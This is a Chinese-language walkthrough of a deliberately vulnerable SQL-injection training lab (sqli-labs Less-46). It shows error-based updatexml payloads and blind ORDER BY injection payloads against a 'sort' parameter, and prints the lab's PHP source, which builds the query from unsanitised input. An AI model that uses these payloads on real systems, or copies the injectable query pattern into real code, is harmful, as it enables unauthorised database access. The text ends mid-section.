# GET-Error based -Numeric -ORDER BY CLAUSE  
TAG：GET型注入、可控的Order by
## 漏洞利用  
![less46_1](images\less46_1.png)  
按照提示输入?sort=1出现查询结果  
![less46_2](images\less46_2.png)  
  
尝试```?sort=1 desc```与```?sort=1 asc```
>order by参数: desc-倒序   asc-正序    

![less46_3](images\less46_3.png)  
  
![less46_4](images\less46_4.png)  
  
发现两次显示不同，可以猜测参数在```order by```后插入，对```order by```参数可控，存在注入可能  
  
测试一下注入    
payload:```?sort=left(version(),1)```
![less46_3](images\less46_7.png)  
payload:```?sort=right(version(),1)```  
![less46_3](images\less46_8.png)  
测试后发现页面没有发生改变，尝试使用报错注入   

构造一个报错注入语句获取用户名  
Payload:```?sort=updatexml(1,if(1=2,1,user()),1)```  
![less46_5](images\less46_5.png)  
  
获取数据库名  
Payload:```?sort=updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)```  
![less46_6](images\less46_6.png)  
  
## 源代码分析  
### less46源代码  
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>ORDER BY-Error-Numeric</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">

<?php
include("../sql-connections/sqli-connect.php");
$id=$_GET['sort'];	
if(isset($id))
	{
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'SORT:'.$id."\n");
	fclose($fp);

	$sql = "SELECT * FROM users ORDER BY $id";
	$result = mysqli_query($con1, $sql);
	if ($result)
		{
		?>
		<center>
		<font color= "#00FF00" size="4">
		
		<table   border=1'>
		<tr>
			<th>&nbsp;ID&nbsp;</th>
			<th>&nbsp;USERNAME&nbsp;  </th>
			<th>&nbsp;PASSWORD&nbsp;  </th>
		</tr>
		</font>
		</font>
		<?php
		while ($row = mysqli_fetch_assoc($result))
			{
			echo '<font color= "#00FF11" size="3">';		
			echo "<tr>";
    			echo "<td>".$row['id']."</td>";
    			echo "<td>".$row['username']."</td>";
    			echo "<td>".$row['password']."</td>";
			echo "</tr>";
			echo "</font>";
			}	
		echo "</table>";
		
		}
		else
		{
		echo '<font color= "#FFFF00">';
		print_r(mysqli_error($con1));
		echo "</font>";  
		}
	}	
	else
	{
		echo "Please input parameter as SORT with numeric value<br><br><br><br>";
		echo "<br><br><br>";
		echo '<img src="../images/Less-46.jpg" /><br>';
		echo "Lesson Concept and code Idea by <b>D4rk</b>";
	}
?>
		
		
</font> </div></br></br></br>

</center> 
</body>
</html>
```
  
### 漏洞点分析  
```
...
$fp=fopen('result.txt','a');
	fwrite($fp,'SORT:'.$id."\n");
	fclose($fp);

	$sql = "SELECT * FROM users ORDER BY $id";
	$result = mysqli_query($con1, $sql);
	if ($result)
		{
		?>
		<center>
		<font color= "#00FF00" size="4">
...
```
观察页面中使用的SQL语句，用户可控的参数在```ORDER BY```之后  
```ORDER BY```是mysql中select语句用于排序查询到的数据的方法  
![less46_9](images\less46_9.png)  
SQL官方文档中说明了order by的用法  
在对order by可控参数的注入时，可以考虑对ORDER BY方法进行闭合后进行注入或者直接进行ORDER BY注入  
ORDER BY注入：  
1. order by if()  
这种构造方法可以进行布尔型盲注和基于时间的盲注  
布尔型盲注：```order by if(表达式,1,(select id from information_schema.tables))```  
基于时间的盲注：```order by if(1=1,1,sleep(1))```
2. order by rand()  
示例：```order by rand(ascii(mid((select database()),1,1))>96)```  
  

闭合ORDER BY方法的注入：  
1. 报错注入  